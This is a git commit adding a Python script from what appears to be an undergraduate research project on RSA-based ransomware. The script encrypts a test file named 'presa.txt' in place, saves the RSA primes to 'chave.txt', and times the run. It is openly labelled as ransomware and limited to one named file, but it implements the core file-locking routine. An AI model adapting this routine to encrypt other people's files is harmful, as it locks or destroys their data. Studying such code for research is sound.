2620c9660b1a4e3b264dd44eb0228a97f2378490
C4ssinelli <101810975+C4ssinelli@users.noreply.github.com>
2024-10-17 20:58:38 -0300

    Create Criptografa.py

---
+++ Iniciação_Científica/Ransomware_RSA/Criptografa.py
@@ -0,0 +1,33 @@
+#Funcional!
+
+import os
+import time
+import Pre_Cod
+import Cod
+
+files = []
+for file in os.listdir():
+    if file == "presa.txt":
+        files.append(file)
+
+print("Arquivos travados: ", files)
+
+n, p, q = Pre_Cod.Calcula_n()
+with open("chave.txt", "wt") as chaves:
+    chaves.write(str(p))
+    chaves.write(" ")
+    chaves.write(str(q))
+
+t_ini_1 = time.time()
+
+for file in files:
+    with open(file, "rt") as thefile:
+        conteudo = thefile.read()
+    conteudo_travado = Cod.Transformar(conteudo, n)
+    with open(file, "wt") as thefile:
+        thefile.write(str(conteudo_travado))
+
+t_fin_1 = time.time()
+
+print("A presa foi pega")
+print("levou", t_fin_1 - t_ini_1, "segundos")
